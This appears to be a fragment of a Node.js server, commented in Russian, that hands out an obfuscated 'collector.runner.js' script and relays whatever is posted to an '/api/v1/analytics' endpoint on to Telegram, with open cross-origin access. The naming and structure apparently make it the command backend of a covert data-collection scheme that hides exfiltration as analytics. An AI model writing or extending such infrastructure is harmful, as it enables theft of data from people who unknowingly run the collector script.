// ... (оставь все импорты и переменные как были)

function send(res, status, body, headers = {}) {
  const payload = Buffer.isBuffer(body) ? body : Buffer.from(String(body));
  res.writeHead(status, {
    "content-length": payload.length,
    "Access-Control-Allow-Origin": "*", // Разрешаем доступ всем
    "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type",
    ...headers,
  });
  res.end(payload);
}

// ... (оставь json, sendToTelegram, encryptedRunner)

const server = http.createServer((req, res) => {
  // Обработка OPTIONS (нужно для CORS)
  if (req.method === 'OPTIONS') {
    res.writeHead(204, {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type"
    });
    return res.end();
  }

  const url = new URL(req.url, `http://${req.headers.host}`);

  if (req.method === "POST" && url.pathname === "/api/v1/analytics") {
    let body = "";
    req.on("data", chunk => body += chunk);
    req.on("end", async () => {
      try {
        const data = JSON.parse(body);
        await sendToTelegram(data);
        json(res, 200, { status: "ok" });
      } catch (e) { json(res, 400, { error: "invalid" }); }
    });
    return;
  }

  if (req.method === "GET" && url.pathname === "/download/collector.runner.js") {
    const source = fs.readFileSync(COLLECTOR_PATH, "utf8");
    return send(res, 200, encryptedRunner(source), { "content-type": "text/javascript" });
  }

  json(res, 404, { error: "not found" });
});

server.listen(PORT, HOST, () => console.log(`Server listening on ${PORT}`));